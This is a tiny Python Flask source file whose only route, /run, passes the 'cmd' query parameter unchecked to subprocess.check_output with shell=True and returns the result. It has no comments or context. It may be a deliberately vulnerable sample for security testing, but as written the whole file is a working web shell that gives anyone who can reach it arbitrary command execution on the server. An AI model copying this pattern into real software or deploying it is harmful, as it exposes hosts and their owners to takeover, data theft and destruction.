import subprocess

from flask import Flask, request

app = Flask(__name__)


@app.route("/run")
def run():
    return subprocess.check_output(request.args["cmd"], shell=True)
